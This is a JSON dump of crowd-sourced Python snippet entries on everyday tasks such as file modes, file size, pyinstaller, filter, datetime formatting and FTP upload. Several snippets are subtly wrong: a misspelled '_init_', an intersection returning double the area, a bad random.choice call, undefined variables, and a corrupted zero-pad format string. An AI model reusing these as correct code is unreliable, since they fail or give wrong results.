    "description": "r for reading r+ opens for reading and writing (cannot truncate a file) w for writing w+ for writing and reading (can truncate a file) rb for reading a binary file. The file pointer is placed at the beginning of the file. rb+ reading or writing a binary file wb+ writing a binary file a+ opens for appending ab+ Opens a file for both appending and reading in binary. The file pointer is at the end of the file if the file exists. The file opens in the append mode. x open for exclusive creation, failing if the file already exists (Python 3)\n# Different modes of text file \"r\" = # Open for reading plain text \"w\" = # Open for writing plain text \"a\" = # Open an existing file for appending plain text \"rb\" = # Open for reading binary data \"wb\" = # Open for writing binary data\n#there are many modes you can open files in. r means read. file = open('C:\\Users\\yourname\\files\\file.txt','r') text = file.read()  #you can write a string to it, too! file = open('C:\\Users\\yourname\\files\\file.txt','w') file.write('This is a typical string')  #don't forget to close it afterwards! file.close()\n",
    "reg_date": "2021-10-12T11:33:12.000Z"
  },
  {
    "id": 3300,
    "keyword": null,
    "link": null,
    "title": " python file size",
    "description": ">>> import os >>> b = os.path.getsize(\"/path/isa_005.mp3\") >>> b 2071611\nimport os  # get size in bytes path = 'path/to/file.txt' size = os.path.getsize(path)\nimport os the_file_that_you_Want_to_check_the_size = os.path.getsize(\"The file Name\") print(the_file_that_you_Want_to_check_the_size) # Your result #\nimport os filepath='file1.txt' size=os.path.getsize(filepath) print(str(size) + ' Bytes') \nimport os os.path.getsize('C:\\\\Python27\\\\Lib\\\\genericpath.py')\n",
    "reg_date": "2021-10-12T11:33:12.000Z"
  },
  {
    "id": 3301,
    "keyword": null,
    "link": null,
    "title": " python file to exe",
    "description": "pip install pyinstaller  cd YourFilePath  pyinstaller --onefile YourFileName\nauto-py-to-exe\npip install auto-py-to-exe auto-py-to-exe  #cmd\npip install pyinstaller  cd PathOfFile  pyinstaller --onefile -w ScriptName.py  (note that if you are using -w then your python file has to be an application and the file will be inside the \"dist\" folder)\npip install pyinstaller  cd FullPathOfFile in cmd console pyinstaller --onefile pythonScriptName.py # a .exe file is created in the FullPathOfFile\\dist\nimport os os.startfile(\"C:\\Documents and Settings\\flow_model\\flow.exe\")\n",
    "reg_date": "2021-10-12T11:33:12.000Z"
  },
  {
    "id": 3302,
    "keyword": null,
    "link": null,
    "title": " python file to string",
    "description": "with open('data.txt', 'r') as file:     data = file.read().replace('\\n', '')\n",
    "reg_date": "2021-10-12T11:33:13.000Z"
  },
  {
    "id": 3303,
    "keyword": null,
    "link": null,
    "title": " python files",
    "description": "with open(\"file.txt\") as file_in:     lines = []     for line in file_in:         lines.append(line)\nr for reading r+ opens for reading and writing (cannot truncate a file) w for writing w+ for writing and reading (can truncate a file) rb for reading a binary file. The file pointer is placed at the beginning of the file. rb+ reading or writing a binary file wb+ writing a binary file a+ opens for appending ab+ Opens a file for both appending and reading in binary. The file pointer is at the end of the file if the file exists. The file opens in the append mode. x open for exclusive creation, failing if the file already exists (Python 3)\nf = open('filename.txt', 'r') #open for reading (default) f = open('filename.txt', 'w') #open for writing, truncating the file first f = open('filename.txt', 'x') #open for exclusive creation, failing if the file already exists f = open('filename.txt', 'a') #open for writing, appending to the end of the file if it exists \nwith open(filename,\"w\") as f:   f.write('Hello World')\n# Reference https://docs.python.org/3/library/functions.html#open  # Method 1 file = open(\"welcome.txt\", \"r\") # mode can be r(read) w(write) and others  data = file.read() file.close()  # Method 2 - automatic close with open(\"welcome.txt\") as infile:   data = file.read() \n#there are many modes you can open files in. r means read. file = open('C:\\Users\\yourname\\files\\file.txt','r') text = file.read()  #you can write a string to it, too! file = open('C:\\Users\\yourname\\files\\file.txt','w') file.write('This is a typical string')  #don't forget to close it afterwards! file.close()\n",
    "reg_date": "2021-10-12T11:33:13.000Z"
  },
  {
    "id": 3304,
    "keyword": null,
    "link": null,
    "title": " python fill table wiget",
    "description": "self.myTableWidget.setItem(X, Y, QtWidgets.QTableWidgetItem('TEXT'))\n",
    "reg_date": "2021-10-12T11:33:13.000Z"
  },
  {
    "id": 3305,
    "keyword": null,
    "link": null,
    "title": " python filter",
    "description": "scores = [70, 60, 80, 90, 50] filtered = filter(lambda score: score >= 70, scores)  print(list(filtered))  # Output: [70, 80, 90]\nnumber_list = range(-5, 5) less_than_zero = list(filter(lambda x: x < 0, number_list)) print(less_than_zero)  # Output: [-5, -4, -3, -2, -1] \nIn simple words, the filter() method filters the given iterable  with the help of a function that tests each element in the iterable to be true or not.  Filter Methods is simply a like comprarator class of c++ STL   Code Explanation:    # A simple tutorial to show the filter  # methods in python  grades = ['A','B','C','F']  def remove_fails(grades):     return grades!='F'  print(list(filter(remove_fails,grades)))\nages = [5, 12, 17, 18, 24, 32] def myFunc(x):   if x < 18:     return False   else:     return True    adults = filter(myFunc, ages) for x in adults:   print(x)     \t\t# 18 24 32\nnums1 = [2,3,5,6,76,4,3,2]  def bada(num):     return num>4 # bada(2) o/p: False, so wont return.. else anything above > value returns true hence filter function shows result    filters = list(filter(bada, nums1)) print(filters)   (or)    bads = list(filter(lambda x: x>4, nums1)) print(bads) \nnumber_list = range(-5, 5) less_than_zero = list(filter(lambda x: x < 0, number_list)) print(less_than_zero)  # Output: [-5, -4, -3, -2, -1] \n",
    "reg_date": "2021-10-12T11:33:13.000Z"
  },
  {
    "id": 3306,
    "keyword": null,
    "link": null,
    "title": " python filter None dictionary",
    "description": "d = dict(a = 1, b = None, c = 3)  filtered = dict(filter(lambda item: item[1] is not None, d.items()))  print(filtered) {'a': 1, 'c': 3}\n",
    "reg_date": "2021-10-12T11:33:13.000Z"
  },
  {
    "id": 3307,
    "keyword": null,
    "link": null,
    "title": " python find and replace string in file",
    "description": "# Read in the file with open('file.txt', 'r') as file :   filedata = file.read()  # Replace the target string filedata = filedata.replace('ram', 'abcd')  # Write the file out again with open('file.txt', 'w') as file:   file.write(filedata)\n#input file fin = open(\"data.txt\", \"rt\") #output file to write the result to fout = open(\"out.txt\", \"wt\") #for each line in the input file for line in fin: \t#read replace the string and write to output file \tfout.write(line.replace('pyton', 'python')) #close input and output files fin.close() fout.close()\nfilename = \"sample1.txt\" # SAMPLE1.TXT # Hello World! # I am a human.  with open(filename, 'r+') as f:     text = f.read()     text = re.sub('human', 'cat', text)     f.seek(0)     f.write(text)     f.truncate()  # SAMPLE1.TXT # Hello World! # I am a cat.\n",
    "reg_date": "2021-10-12T11:33:13.000Z"
  },
  {
    "id": 3308,
    "keyword": null,
    "link": null,
    "title": " python find dict in list of dict by id",
    "description": ">>> dicts = [      { \"name\": \"Tom\", \"age\": 10 },      { \"name\": \"Mark\", \"age\": 5 },      { \"name\": \"Pam\", \"age\": 7 },      { \"name\": \"Dick\", \"age\": 12 }  ] >>> next(item for item in dicts if item[\"name\"] == \"Pam\") {'age': 7, 'name': 'Pam'}  # WITH DEFAULT VALUE TO None if None next((item for item in dicts if item[\"name\"] == \"pam\"), None)\n",
    "reg_date": "2021-10-12T11:33:13.000Z"
  },
  {
    "id": 3309,
    "keyword": null,
    "link": null,
    "title": " python find index of highest value in list",
    "description": "numbers = [5, 4, 7, 3, 9, 1, 2] biggest_number = max(numbers) print(numbers.index(biggest_number))\nresult = numpy.where(arr == numpy.amax(arr))\nnumbers = 1,3,11,42,12,4001 highestnumber = -999 for i in numbers:   if i > highestnumber:     highestnumber = i print(numbers.index(highestnumber))\n",
    "reg_date": "2021-10-12T11:33:13.000Z"
  },
  {
    "id": 3310,
    "keyword": null,
    "link": null,
    "title": " python find index of nth occurrence in list",
    "description": "# Basic syntax using list comprehension: [i for i, n in enumerate(your_list) if n == condition][match_number] # Where: #\t- This setup makes a list of the indexes for list items that meet #\t\tthe condition and then match_number returns the nth index #\t- enumerate() returns iterates through your_list and returns each #\t\telement (n) and index value (i)  # Example usage: your_list = ['w', 'e', 's', 's', 's', 'z','z', 's'] [i for i, n in enumerate(your_list) if n == 's'][0] --> 2 # 2 is returned because it is the index of the first element that #\tmeets the condition (being 's')\n",
    "reg_date": "2021-10-12T11:33:13.000Z"
  },
  {
    "id": 3311,
    "keyword": null,
    "link": null,
    "title": " python find methods in class",
    "description": "#This method is used to list all the fields and methods of your object (as a tuple) dir(theobject)\n",
    "reg_date": "2021-10-12T11:33:13.000Z"
  },
  {
    "id": 3312,
    "keyword": null,
    "link": null,
    "title": " python find methods of object",
    "description": "#This method is used to list all the fields and methods of your object (as a tuple) dir(theobject)\n",
    "reg_date": "2021-10-12T11:33:14.000Z"
  },
  {
    "id": 3313,
    "keyword": null,
    "link": null,
    "title": " python find most occuring element",
    "description": "from collections import Counter  a = [1936, 2401, 2916, 4761, 9216, 9216, 9604, 9801]   c = Counter(a)  print(c.most_common(1)) # the one most common element... 2 would mean the 2 most common [(9216, 2)] # a set containing the element, and it's count in 'a'\n",
    "reg_date": "2021-10-12T11:33:14.000Z"
  },
  {
    "id": 3314,
    "keyword": null,
    "link": null,
    "title": " python find runtime",
    "description": "import time start_time = time.time() main() print(\"--- %s seconds ---\" % (time.time() - start_time)) \n",
    "reg_date": "2021-10-12T11:33:14.000Z"
  },
  {
    "id": 3315,
    "keyword": null,
    "link": null,
    "title": " python find second occurrence in string",
    "description": "# string replace() function perfectly solves this problem:  # string.replace(s, old, new[, maxreplace])  # Return a copy of string s with all occurrences of substring old replaced  # by new. If the optional argument maxreplace is given, the first maxreplace  # occurrences are replaced.  >>> u'longlongTESTstringTEST'.replace('TEST', '?', 1) u'longlong?stringTEST'\n# find index of second occurence of substring in string idx = string.find(substring, string.find(substring) + 1) \n#iterate through list for item in yourlist:     #if item is equal to a value     if item == 'value':         #store the item in a variable         yourvar = item         #break out of loop         break\n",
    "reg_date": "2021-10-12T11:33:14.000Z"
  },
  {
    "id": 3316,
    "keyword": null,
    "link": null,
    "title": " python find smallest element in dictionary",
    "description": "d = {\"A\":3, \"B\":1, \"C\":100}  # find key with lowest value best_key = min(d, key=d.get)  print(best_key) # output: B\nd = {'A': 4,'B':10} min_v = min(zip(d.values(), d.keys())) # min_v is (4,'A')  max_v = max(zip(d.values(), d.keys())) # max_v is (10,'B') \n",
    "reg_date": "2021-10-12T11:33:14.000Z"
  },
  {
    "id": 3317,
    "keyword": null,
    "link": null,
    "title": " python find the key with max value",
    "description": "a_dictionary = {\"a\": 1, \"b\": 2, \"c\": 3}  # get key with max value max_key = max(a_dictionary, key=a_dictionary.get)  print(max_key)\ndic={0: 1.4984074067880424, 1: 1.0984074067880423, 2: 1.8984074067880425, 3: 2.2984074067880425, 4: 2.2984074067880425} max_value = max(dic.values())  # maximum value max_keys = [k for k, v in dic.items() if v == max_value] # getting all keys containing the `maximum`  print(max_value, max_keys)\nmy_dict = {'a': 5, 'b': 10, 'c': 6, 'd': 12, 'e': 7} max(my_dict, key=my_dict.get) # returns 'd'\nimport operator stats = {'a':1000, 'b':3000, 'c': 100} max(stats.iteritems(), key=operator.itemgetter(1))[0]\n",
    "reg_date": "2021-10-12T11:33:14.000Z"
  },
  {
    "id": 3318,
    "keyword": null,
    "link": null,
    "title": " python find two rectangle intersections",
    "description": "import math class corner:     def _init_(self, x, y):         self.x = x         self.y = y def intersection(l1,b1,r1,t1,l2,b2,r2,t2):     lb1 = corner(l1,b1)     rt1 = corner(r1, t1)     lb2 = corner(l2,b2)     rt2 = corner(r2, t2)     intr1 = min(rt1.x, rt2.x) - max(lb1.x, lb2.x)     intr2 = min(rt1.y, rt2.y) - max(lb1.y, lb2.y)     if intr1>=0 and intr2>=0:         return 2*(intr1*intr2) print(intersection(0,0,5,5,3,3,7,7))\n",
    "reg_date": "2021-10-12T11:33:14.000Z"
  },
  {
    "id": 3319,
    "keyword": null,
    "link": null,
    "title": " python first day of last month",
    "description": "from datetime import date, timedelta  last_day_of_prev_month = date.today().replace(day=1) - timedelta(days=1)  start_day_of_prev_month = date.today().replace(day=1) - timedelta(days=last_day_of_prev_month.day)  # For printing results print(\"First day of prev month:\", start_day_of_prev_month) print(\"Last day of prev month:\", last_day_of_prev_month)\nfrom datetime import datetime  datetime.today().replace(day=1)\n>>import calendar >>year, month = 2016, 12 >>calendar.monthrange(year, month)[1] 31 \n",
    "reg_date": "2021-10-12T11:33:14.000Z"
  },
  {
    "id": 3320,
    "keyword": null,
    "link": null,
    "title": " python flask query params",
    "description": "from flask import request  @app.route('/data') def data():     # here we want to get the value of user (i.e. ?user=some-value)     user = request.args.get('user')\n",
    "reg_date": "2021-10-12T11:33:14.000Z"
  },
  {
    "id": 3321,
    "keyword": null,
    "link": null,
    "title": " python flat list from list of list",
    "description": "flattened = [val for sublist in list_of_lists for val in sublist]\nflat_list = [item for sublist in l for item in sublist]  #which is equivalent to this  flat_list = [] for sublist in l:     for item in sublist:         flat_list.append(item)\n# idiomatic python  # using itertools import itertools  list_of_list = [[1, 2, 3], [4, 5], [6]] chain = itertools.chain(*images)  flattened_list = list(chain) # [1, 2, 3, 4, 5, 6]\nflat_list = [] for sublist in l:     for item in sublist:         flat_list.append(item)\n",
    "reg_date": "2021-10-12T11:33:14.000Z"
  },
  {
    "id": 3322,
    "keyword": null,
    "link": null,
    "title": " python flatten array of arrays",
    "description": "import numpy as np out = np.concatenate(input_list).ravel() \n",
    "reg_date": "2021-10-12T11:33:15.000Z"
  },
  {
    "id": 3323,
    "keyword": null,
    "link": null,
    "title": " python flip a coin",
    "description": "import random  result = random.choice([\"Heads\",\"Tails\"])\n# Import the RANDOM library. import random as RANDOM # the 'as RANDOM' part could be optionial,  # it's just choosing a name for the import.  def flip():   flipped = RANDOM.choice('Heads','Tails')   print(f'You flipped {flipped}')\nimport random result = random.choice([\"Heads\",\"Tails\"])\n",
    "reg_date": "2021-10-12T11:33:15.000Z"
  },
  {
    "id": 3324,
    "keyword": null,
    "link": null,
    "title": " python float to fraction",
    "description": ">>> from fractions import Fraction >>> Fraction(0.25) Fraction(1, 4)\n",
    "reg_date": "2021-10-12T11:33:15.000Z"
  },
  {
    "id": 3325,
    "keyword": null,
    "link": null,
    "title": " python for doing os command execution",
    "description": "import os os.system(\"start chrome\") os.system(\"py\")\n",
    "reg_date": "2021-10-12T11:33:15.000Z"
  },
  {
    "id": 3326,
    "keyword": null,
    "link": null,
    "title": " python for enumerate loop",
    "description": ">>> values = [\"a\",\"b\",\"c\"] >>> for count, value in enumerate(values): ...     print(count, value) ... 0 a 1 b 2 c \npresidents = [\"Washington\", \"Adams\", \"Jefferson\", \"Madison\", \"Monroe\", \"Adams\", \"Jackson\"] for num, name in enumerate(presidents, start=1):     print(\"President {}: {}\".format(num, name)) \n",
    "reg_date": "2021-10-12T11:33:15.000Z"
  },
  {
    "id": 3327,
    "keyword": null,
    "link": null,
    "title": " python for loop even numbers",
    "description": "for i in range(2,11,2): # range(start, end, step)   print(i)\n",
    "reg_date": "2021-10-12T11:33:15.000Z"
  },
  {
    "id": 3328,
    "keyword": null,
    "link": null,
    "title": " python for loop handle",
    "description": "f = open(\"demofile.txt\", \"r\") for x in f:     print(x) #will print the whole content of the file.\n",
    "reg_date": "2021-10-12T11:33:15.000Z"
  },
  {
    "id": 3329,
    "keyword": null,
    "link": null,
    "title": " python for loop jump by 2",
    "description": "for i in range(0,10,2):   print(i) \n",
    "reg_date": "2021-10-12T11:33:15.000Z"
  },
  {
    "id": 3330,
    "keyword": null,
    "link": null,
    "title": " python for loop m to n",
    "description": "for i in range (m,n+1):     s += i     print(i)  print(s) \nrange(10, 0, -1) \n",
    "reg_date": "2021-10-12T11:33:15.000Z"
  },
  {
    "id": 3331,
    "keyword": null,
    "link": null,
    "title": " python for property in object",
    "description": "for property, value in myObject.items():   print(property, \":\", value)\n",
    "reg_date": "2021-10-12T11:33:15.000Z"
  },
  {
    "id": 3332,
    "keyword": null,
    "link": null,
    "title": " python for with iterator index",
    "description": "for index, value in enumerate(iterator):     print(index, value)\narray = range(10) for i in range(len(array)):   print(array[i])\npresidents = [\"Washington\", \"Adams\", \"Jefferson\", \"Madison\", \"Monroe\", \"Adams\", \"Jackson\"] for num, name in enumerate(presidents, start=1):     print(\"President {}: {}\".format(num, name)) \narray = [\"Var1\",\"Var2\",\"Var3\"] for i in range(len(array)):   print(array[i])    #Output# #Var1 #Var2 #Var3\n",
    "reg_date": "2021-10-12T11:33:16.000Z"
  },
  {
    "id": 3333,
    "keyword": null,
    "link": null,
    "title": " python foresch",
    "description": "for pet in pets:     print pet\n",
    "reg_date": "2021-10-12T11:33:16.000Z"
  },
  {
    "id": 3334,
    "keyword": null,
    "link": null,
    "title": " python format datetime",
    "description": "import datetime  today = datetime.datetime.now() date_time = today.strftime(\"%m/%d/%Y, %H:%M:%S\") print(\"date and time:\",date_time)\n# 10 July 2021, 10:54:27AM datetime.strftime(\"%-d %B %Y, %I:%M:%S%p\")\n| Directive | Meaning                                                        | Example                 |  |-----------|------------------------------------------------------------------------------------------| |%a         | Abbreviated weekday name.                                      | Sun, Mon, ..            |  |%A         | Full weekday name.                                             | Sunday, Monday, ...     |  |%w         | Weekday as a decimal number.                                   | 0, 1, ..., 6            |  |%d         | Day of the month as a zero-padded decimal.                     | 01, 02, ..., 31         |  |%-d        | Day of the month as a decimal number.                          | 1, 2, ..., 30           |  |%b         | Abbreviated month name.                                        | Jan, Feb, ..., Dec      |  |%B         | Full month name.                                               | January, February, ...  |  |%m         | Month as a zero-padded decimal number.                         | 01, 02, ..., 12         |  |%-m        | Month as a decimal number.                                     | 1, 2, ..., 12           |  |%y         | Year without century as a zero-padded decimal number.          | 00, 01, ..., 99         |  |%-y        | Year without century as a decimal number.                      | 0, 1, ..., 99           |  |%Y         | Year with century as a decimal number.                         | 2013, 2019 etc.         |  |%H         | Hour (24-hour clock) as a zero-padded decimal number.          | 00, 01, ..., 23         |  |%-H        | Hour (24-hour clock) as a decimal number.                      | 0, 1, ..., 23           |  |%I         | Hour (12-hour clock) as a zero-padded decimal number.          | 01, 02, ..., 12         |  |%-I        | Hour (12-hour clock) as a decimal number.                      | 1, 2, ... 12            |  |%p         | Locale&rsquo;s AM or PM.                                             | AM, PM                  |  |%M         | Minute as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-M        | Minute as a decimal number.                                    | 0, 1, ..., 59           |  |%S         | Second as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-S        | Second as a decimal number.                                    | 0, 1, ..., 59           |  |%f         | Microsecond as a decimal number, zero-padded on the left.      | 000000 - 999999         |  |%z         | UTC offset in the form +HHMM or -HHMM.                         |                         |  |%Z         | Time zone name.                                                |                         |  |%j         | Day of the year as a zero-padded decimal number.               | 001, 002, ..., 366      |  |%-j        | Day of the year as a decimal number. 1, 2, ..., 366            |                         |  |%U         | Week number of the year (Sunday as the first day of the week). | 00, 01, ..., 53         |  |%W         | Week number of the year (Monday as the first day of the week). | 00, 01, ..., 53         |  |%c         | Locale&rsquo;s appropriate date and time representation.             | Mon Sep 30 07:06:05 2013| |%x         | Locale&rsquo;s appropriate date representation.                      | 09/30/13                |  |%X         | Locale&rsquo;s appropriate time representation.                      | 07:06:05                |  |%%         | A literal '%' character.                                       | %                       |  \nfrom datetime import datetime as d date = d.now() print(date.strftime(\"%Y-%m-%d %H:%M:%S\"))\n%a - Abbreviated weekday name. (Sun, Mon, ...) %A - Full weekday name. (Sunday, Monday, ...) %w - Weekday as a decimal number. (0, 1, ..., 6) %d - Day of the month as a zero-padded decimal. (01, 02, ..., 31) %-d - Day of the month as a decimal number. (1, 2, ..., 30) %b - Abbreviated month name. (Jan, Feb, ..., Dec) %B - Full month name. (January, February, ...) %m - Month as a zero-padded decimal number. (01, 02, ..., 12) %-m - Month as a decimal number. (1, 2, ..., 12) %y - Year without century as a zero-padded decimal number. (00, 01, ..., 99) %-y - Year without century as a decimal number. (0, 1, ..., 99) %Y - Year with century as a decimal number. (2013, 2019 etc.) %H - Hour (24-hour clock) as a zero-padded decimal number. (00, 01, ..., 23) %-H - Hour (24-hour clock) as a decimal number. (0, 1, ..., 23) %I - Hour (12-hour clock) as a zero-padded decimal number. (01, 02, ..., 12) %-I - Hour (12-hour clock) as a decimal number. (1, 2, ... 12) %p - Locale&rsquo;s AM or PM. (AM, PM) %M - Minute as a zero-padded decimal number. (00, 01, ..., 59) %-M - Minute as a decimal number. (0, 1, ..., 59) %S - Second as a zero-padded decimal number. (00, 01, ..., 59) %-S - Second as a decimal number. (0, 1, ..., 59) %f - Microsecond as a decimal number, zero-padded on the left.  (000000 - 999999) %z - UTC offset in the form +HHMM or -HHMM.   %Z - Time zone name.  %j - Day of the year as a zero-padded decimal number. (001, 002, ..., 366) %-j - Day of the year as a decimal number. (1, 2, ..., 366) %U - Week number of the year (Sunday as the first day of the week). All days in a new year preceding the first Sunday are considered to be in week 0. (00, 01, ..., 53) %W - Week number of the year (Monday as the first day of the week). All days in a new year preceding the first Monday are considered to be in week 0. (00, 01, ..., 53) %c - Locale&rsquo;s appropriate date and time representation. (Mon Sep 30 07:06:05 2013) %x - Locale&rsquo;s appropriate date representation. (09/30/13) %X - Locale&rsquo;s appropriate time representation. (07:06:05) %% - A literal '%' character. (%)\nimport datetime print(datetime.datetime.now()) #datetime.datetime.now() is the syntax \n",
    "reg_date": "2021-10-12T11:33:16.000Z"
  },
  {
    "id": 3335,
    "keyword": null,
    "link": null,
    "title": " python format only 1 decimal place",
    "description": ">>> \"{0:0.1f}\".format(45.34531) '45.3'\n",
    "reg_date": "2021-10-12T11:33:16.000Z"
  },
  {
    "id": 3336,
    "keyword": null,
    "link": null,
    "title": " python format seconds to hh mm ss",
    "description": "import time time.strftime('%H:%M:%S', time.gmtime(12345)) #'03:25:45'\n",
    "reg_date": "2021-10-12T11:33:16.000Z"
  },
  {
    "id": 3337,
    "keyword": null,
    "link": null,
    "title": " python format string zero pad",
    "description": ">>> n = '4' >>> print(n.zfill(3)) # 004 >>> n = 4 >>> print(f'{n:03}') # Preferred method, python >= 3.6 #004 >>> print('\u0003d' % n) #004 >>> print(format(n, '03')) # python >= 2.6 #004 >>> print('{0:03d}'.format(n))  # python >= 2.6 + python 3 #004 >>> print('{foo:03d}'.format(foo=n))  # python >= 2.6 + python 3 #004 >>> print('{:03d}'.format(n))  # python >= 2.7 + python3 #004\n",
    "reg_date": "2021-10-12T11:33:16.000Z"
  },
  {
    "id": 3338,
    "keyword": null,
    "link": null,
    "title": " python ftp upload file",
    "description": "import ftplib session = ftplib.FTP('server.address.com','USERNAME','PASSWORD') file = open('kitten.jpg','rb')                  # file to send session.storbinary('STOR kitten.jpg', file)     # send the file file.close()                                    # close file and FTP session.quit() \n",
    "reg_date": "2021-10-12T11:33:16.000Z"
  },
  {
    "id": 3339,
    "keyword": null,
    "link": null,
    "title": " python function find name",
    "description": "def functionA():     print (\"First function called!\")  def functionB():     print (\"\\nSecond function called!\")  functionA() print (\"First function name: \", functionA.__name__)  functionB() print (\"Second function name: \", functionB.__name__) # OUTPUT: First function called! First function name:  functionA    Second function called! Second function name:  functionB\ndef my_function():     pass  class MyClass(object):     def method(self):         pass  print(my_function.__name__)         # gives \"my_function\" print(MyClass.method.__name__)      # gives \"method\"  print(my_function.__qualname__)     # gives \"my_function\" print(MyClass.method.__qualname__)  # gives \"MyClass.method\"\nfor i in a:     print i.__name__\n",
    "reg_date": "2021-10-12T11:33:16.000Z"
  },
  {
    "id": 3340,
    "keyword": null,
    "link": null,
    "title": " python function to check list element ratio with total data",
    "description": "def compensate_imbalance(data):     total_data = len(data)     clean_data = [item for n, item in enumerate(data) if item not in data[:n]]     weight_list = [data.count(item)/total_data for item in clean_data]     return weight_list\n",
    "reg_date": "2021-10-12T11:33:16.000Z"
  },
  {
    "id": 3341,
    "keyword": null,
    "link": null,
    "title": " python function to print random number",
    "description": "import random n = random.randint(0,22) print(n)\n",
    "reg_date": "2021-10-12T11:33:16.000Z"
  },
  {
    "id": 3342,
    "keyword": null,
    "link": null,
    "title": " python game engine",
    "description": "# All python game engines here, just choose : # https://www.gamefromscratch.com/post/2018/09/13/Python-Game-Engines.aspx\nVideo games uses or made by using python python 1. Battlefield 2 uses Python for all of its add-ons and a lot of its functionality. 2. Bridge Commander 3. Civilization IV uses Python for most of its tasks 4. Disney's Toontown Online is written in Python and uses Panda3D for graphics. 5. Doki Doki Literature Club!, a psychological horror visual novel using the Ren'Py engine 6. Eve Online uses Stackless Python. 7. Freedom Force 8. Frets on Fire is written in Python and uses Pygame 9. Mount & Blade is written in Python. 10. Pirates of the Caribbean Online is written in Python and uses Panda3D for graphics. 11. The Sims 4 uses Python 12. The Temple of Elemental Evil, a computer role-playing game based on the classic Greyhawk Dungeons & Dragons campaign setting 13. Unity of Command (video game) is an operational-level wargame about the 1942/43 Stalingrad Campaign on the Eastern Front. 14. Vampire: The Masquerade &ndash; Bloodlines, a computer role-playing game based on the World of Darkness campaign setting 15. Vega Strike, an open source space simulator, uses Python for internal scripting 16. World of Tanks uses Python for most of its tasks. \n",
    "reg_date": "2021-10-12T11:33:16.000Z"
  },
  {
    "id": 3343,
    "keyword": null,
    "link": null,
    "title": " python generate folder if it not exist",
    "description": "import os if not os.path.exists('my_folder'):     os.makedirs('my_folder')\n",
    "reg_date": "2021-10-12T11:33:17.000Z"
  },
  {
    "id": 3344,
    "keyword": null,
    "link": null,
    "title": " python generate random string with lenght",
    "description": "import random import string  def randStr(chars = string.ascii_uppercase + string.digits, N=10): \treturn ''.join(random.choice(chars) for _ in range(N))  # default length(=10) random string print(randStr()) # random string of length 7 print(randStr(N=7))  # random string with characters picked from ascii_lowercase print(randStr(chars=string.ascii_lowercase)) # random string with characters picked from 'abcdef123456' print(randStr(chars='abcdef123456'))\n",
    "reg_date": "2021-10-12T11:33:17.000Z"
  },
  {
    "id": 3345,
    "keyword": null,
    "link": null,
    "title": " python generate uid",
    "description": "# Python3 code to generate the  # random id using uuid1()     import uuid     # Printing random id using uuid1()  print (\"The random id using uuid1() is : \",end=\"\")  print (uuid.uuid1()) \n",
    "reg_date": "2021-10-12T11:33:17.000Z"
  },
  {
    "id": 3346,
    "keyword": null,
    "link": null,
    "title": " python get a vector of row sums from an array",
    "description": "# Basic syntax: np.sum(your_array, axis=1).tolist() # Where axis=1 sums across rows and axis=0 sums across columns  # Example usage: import numpy as np your_array = np.array([range(0,4),range(3,7),range(1,5),range(2,6)]) print(your_array) --> [[0 1 2 3]  \t [3 4 5 6]      [1 2 3 4]      [2 3 4 5]]  np.sum(your_array, axis=0).tolist() # Return column sums --> [6, 10, 14, 18] np.sum(your_array, axis=1).tolist() # Return row sums --> [6, 18, 10, 14]\n",
    "reg_date": "2021-10-12T11:33:17.000Z"
  },
  {
    "id": 3347,
    "keyword": null,
    "link": null,
    "title": " python get absolute path of file",
    "description": "import os # you have to be in the same directory as the file file = 'myfile.txt' # or also file = 'directory/to/myfile.txt'  path = os.path.abspath(file) \n>>> import os >>> os.path.abspath(\"mydir/myfile.txt\") 'C:/example/cwd/mydir/myfile.txt'\n",
    "reg_date": "2021-10-12T11:33:17.000Z"
  },
  {
    "id": 3348,
    "keyword": null,
    "link": null,
    "title": " python get actual timestamp",
    "description": "import datetime ts = datetime.datetime.now().timestamp()\n",
    "reg_date": "2021-10-12T11:33:17.000Z"
  },
  {
    "id": 3349,
    "keyword": null,
    "link": null,
    "title": " python get all file names in a dir",
    "description": "from os import listdir from os.path import isfile, join onlyfiles = [f for f in listdir(mypath) if isfile(join(mypath, f))]\nimport os  def get_filepaths(directory):     \"\"\"     This function will generate the file names in a directory      tree by walking the tree either top-down or bottom-up. For each      directory in the tree rooted at directory top (including top itself),      it yields a 3-tuple (dirpath, dirnames, filenames).     \"\"\"     file_paths = []  # List which will store all of the full filepaths.      # Walk the tree.     for root, directories, files in os.walk(directory):         for filename in files:             # Join the two strings in order to form the full filepath.             filepath = os.path.join(root, filename)             file_paths.append(filepath)  # Add it to the list.      return file_paths  # Self-explanatory.  # Run the above function and store its results in a variable.    full_file_paths = get_filepaths(\"/Users/johnny/Desktop/TEST\")\nPython By Charming Caribou on Mar 26 2020 import os  def get_filepaths(directory):     \"\"\"     This function will generate the file names in a directory      tree by walking the tree either top-down or bottom-up. For each      directory in the tree rooted at directory top (including top itself),      it yields a 3-tuple (dirpath, dirnames, filenames).     \"\"\"     file_paths = []  # List which will store all of the full filepaths.      # Walk the tree.     for root, directories, files in os.walk(directory):         for filename in files:             # Join the two strings in order to form the full filepath.             filepath = os.path.join(root, filename)             file_paths.append(filepath)  # Add it to the list.      return file_paths  # Self-explanatory.  # Run the above function and store its results in a variable.    full_file_paths = get_filepaths(\"/Users/johnny/Desktop/TEST\")\n#get all .txt files in my_path import glob my_path='/home/folder/' files=glob.glob(my_path+'*.txt')\nimport glob files=glob.glob(given_path)\n",
    "reg_date": "2021-10-12T11:33:17.000Z"
  },
  {
    "id": 3350,
    "keyword": null,
    "link": null,
    "title": " python get all images in directory",
    "description": "import cv2 import glob  imdir = 'path/to/files/' ext = ['png', 'jpg', 'gif']    # Add image formats here  files = [] [files.extend(glob.glob(imdir + '*.' + e)) for e in ext]  images = [cv2.imread(file) for file in files] \nimport glob  for filename in glob.iglob(root_dir + '**/*.jpg', recursive=True):     # Do something\n",
    "reg_date": "2021-10-12T11:33:17.000Z"
  },
  {
    "id": 3351,
    "keyword": null,
    "link": null,
    "title": " python get all methods of a class",
    "description": "#This method is used to list all the fields and methods of your object (as a tuple) dir(theobject)\n",
    "reg_date": "2021-10-12T11:33:17.000Z"
  },
  {
    "id": 3352,
    "keyword": null,
    "link": null,
    "title": " python get all variables in class",
    "description": "vars = [attr for attr in dir(dino) if not callable(getattr(dino, attr)) and not attr.startswith(\"__\")]           for v in vars: \tprint(\"{0} = {1}\".format(v,getattr(dino, v)))\n",
    "reg_date": "2021-10-12T11:33:17.000Z"
  },
  {
    "id": 3353,
    "keyword": null,
    "link": null,
    "title": " python get appdata path",
    "description": "import os  datapath = os.getenv('APPDATA')\n# pip instapp appdata  from appdata import AppDataPaths paths = AppDataPaths('myapp')\n",
